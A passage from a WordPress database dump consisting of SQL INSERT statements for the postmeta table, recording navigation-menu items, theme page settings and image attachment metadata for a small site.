INSERT INTO `cmrfu_postmeta` VALUES("1346","785","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1347","785","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1348","785","_menu_item_object_id","379");
INSERT INTO `cmrfu_postmeta` VALUES("1349","785","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1350","785","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1351","785","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1352","785","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1353","785","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1354","786","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1355","786","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1356","786","_menu_item_object_id","497");
INSERT INTO `cmrfu_postmeta` VALUES("1357","786","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1358","786","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1359","786","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1360","786","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1361","786","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1362","787","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1363","787","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1364","787","_menu_item_object_id","517");
INSERT INTO `cmrfu_postmeta` VALUES("1365","787","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1366","787","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1367","787","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1368","787","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1369","787","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1370","788","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1371","788","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1372","788","_menu_item_object_id","671");
INSERT INTO `cmrfu_postmeta` VALUES("1373","788","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1374","788","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1375","788","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1376","788","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1377","788","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1378","789","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1379","789","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1380","789","_menu_item_object_id","678");
INSERT INTO `cmrfu_postmeta` VALUES("1381","789","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1382","789","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1383","789","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1384","789","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1385","789","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1386","790","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1387","790","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1388","790","_menu_item_object_id","674");
INSERT INTO `cmrfu_postmeta` VALUES("1389","790","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1390","790","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1391","790","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1392","790","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1393","790","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1394","791","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1395","791","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1396","791","_menu_item_object_id","676");
INSERT INTO `cmrfu_postmeta` VALUES("1397","791","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1398","791","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1399","791","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1400","791","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1401","791","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1402","792","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1403","792","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1404","792","_menu_item_object_id","647");
INSERT INTO `cmrfu_postmeta` VALUES("1405","792","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1406","792","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1407","792","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1408","792","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1409","792","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1410","793","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1411","793","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1412","793","_menu_item_object_id","649");
INSERT INTO `cmrfu_postmeta` VALUES("1413","793","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1414","793","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1415","793","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1416","793","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1417","793","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1418","794","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1419","794","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1420","794","_menu_item_object_id","655");
INSERT INTO `cmrfu_postmeta` VALUES("1421","794","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1422","794","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1423","794","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1424","794","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1425","794","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1426","795","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1427","795","_menu_item_menu_item_parent","794");
INSERT INTO `cmrfu_postmeta` VALUES("1428","795","_menu_item_object_id","651");
INSERT INTO `cmrfu_postmeta` VALUES("1429","795","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1430","795","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1431","795","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1432","795","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1433","795","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1434","796","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1435","796","_menu_item_menu_item_parent","794");
INSERT INTO `cmrfu_postmeta` VALUES("1436","796","_menu_item_object_id","653");
INSERT INTO `cmrfu_postmeta` VALUES("1437","796","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1438","796","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1439","796","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1440","796","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1441","796","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1442","797","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1443","797","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1444","797","_menu_item_object_id","186");
INSERT INTO `cmrfu_postmeta` VALUES("1445","797","_menu_item_object","portfolio");
INSERT INTO `cmrfu_postmeta` VALUES("1446","797","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1447","797","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1448","797","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1449","797","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1450","798","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1451","798","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1452","798","_menu_item_object_id","454");
INSERT INTO `cmrfu_postmeta` VALUES("1453","798","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1454","798","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1455","798","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1456","798","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1457","798","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1458","799","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1459","799","_menu_item_menu_item_parent","798");
INSERT INTO `cmrfu_postmeta` VALUES("1460","799","_menu_item_object_id","473");
INSERT INTO `cmrfu_postmeta` VALUES("1461","799","_menu_item_object","post");
INSERT INTO `cmrfu_postmeta` VALUES("1462","799","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1463","799","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1464","799","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1465","799","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1466","800","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1467","800","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1468","800","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("1469","800","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1470","800","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1471","800","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1472","800","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1473","800","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1474","801","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1475","801","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1476","801","_menu_item_object_id","708");
INSERT INTO `cmrfu_postmeta` VALUES("1477","801","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1478","801","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1479","801","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1480","801","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1481","801","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1897","924","_edit_lock","1477778075:1");
INSERT INTO `cmrfu_postmeta` VALUES("1891","921","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1896","924","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1889","921","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1888","921","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1887","921","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1886","921","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1885","921","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1988","946","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1977","944","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1963","943","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1866","915","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1867","915","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1860","915","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1945","939","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1913","932","er_leaf_portfolio_columns","col-3");
INSERT INTO `cmrfu_postmeta` VALUES("1932","935","er_leaf_page_title","0");
INSERT INTO `cmrfu_postmeta` VALUES("1924","934","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1919","934","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1898","924","_format_audio_embed","");
INSERT INTO `cmrfu_postmeta` VALUES("2026","951","_wp_attached_file","2014/08/baykaralar.png");
INSERT INTO `cmrfu_postmeta` VALUES("1892","454","_edit_lock","1401708094:1");
INSERT INTO `cmrfu_postmeta` VALUES("1537","715","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1643","824","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/1.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"1-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"1-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"1-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"1-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"1-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"1-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1642","824","_wp_attached_file","2013/10/1.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1641","186","_thumbnail_id","823");
INSERT INTO `cmrfu_postmeta` VALUES("1550","186","_edit_lock","1401701384:1");
INSERT INTO `cmrfu_postmeta` VALUES("1551","804","_wp_attached_file","2014/02/517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1552","804","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:350;s:4:\"file\";s:80:\"2014/02/517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:80:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:80:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-300x109.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:80:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:80:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-450x350.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:350;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:80:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:78:\"517_Residential_Integral-Construction-Mtn-View-Road-Home.jpg-960x350-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1553","805","_wp_attached_file","2014/02/bright_squares.png");
INSERT INTO `cmrfu_postmeta` VALUES("1554","805","_wp_attachment_metadata","a:5:{s:5:\"width\";i:297;s:6:\"height\";i:297;s:4:\"file\";s:26:\"2014/02/bright_squares.png\";s:5:\"sizes\";a:4:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:26:\"bright_squares-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:26:\"bright_squares-297x230.png\";s:5:\"width\";i:297;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:26:\"bright_squares-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:24:\"bright_squares-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1640","823","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/9.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"9-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"9-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"9-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"9-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"9-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"9-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1638","821","_wp_attachment_metadata","a:5:{s:5:\"width\";i:103;s:6:\"height\";i:60;s:4:\"file\";s:23:\"2014/06/herkon-logo.png\";s:5:\"sizes\";a:1:{s:11:\"recent-post\";a:4:{s:4:\"file\";s:21:\"herkon-logo-85x60.png\";s:5:\"width\";i:85;s:6:\"height\";i:60;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1637","821","_wp_attached_file","2014/06/herkon-logo.png");
INSERT INTO `cmrfu_postmeta` VALUES("1634","817","_wp_attached_file","2013/10/nophoto.png");
INSERT INTO `cmrfu_postmeta` VALUES("1635","817","_wp_attachment_metadata","a:5:{s:5:\"width\";i:680;s:6:\"height\";i:480;s:4:\"file\";s:19:\"2013/10/nophoto.png\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:19:\"nophoto-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:19:\"nophoto-300x211.png\";s:5:\"width\";i:300;s:6:\"height\";i:211;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:19:\"nophoto-680x230.png\";s:5:\"width\";i:680;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:19:\"nophoto-450x480.png\";s:5:\"width\";i:450;s:6:\"height\";i:480;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:19:\"nophoto-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:17:\"nophoto-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1636","447","_edit_lock","1478305312:1");
INSERT INTO `cmrfu_postmeta` VALUES("1644","825","_wp_attached_file","2013/10/2.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1645","825","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/2.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"2-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"2-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"2-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"2-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"2-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"2-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1646","826","_wp_attached_file","2013/10/3.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1647","826","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/3.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"3-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"3-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"3-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"3-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"3-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"3-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1648","827","_wp_attached_file","2013/10/4.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1649","827","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/4.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"4-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"4-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"4-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"4-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"4-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"4-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1650","828","_wp_attached_file","2013/10/5.jpg");
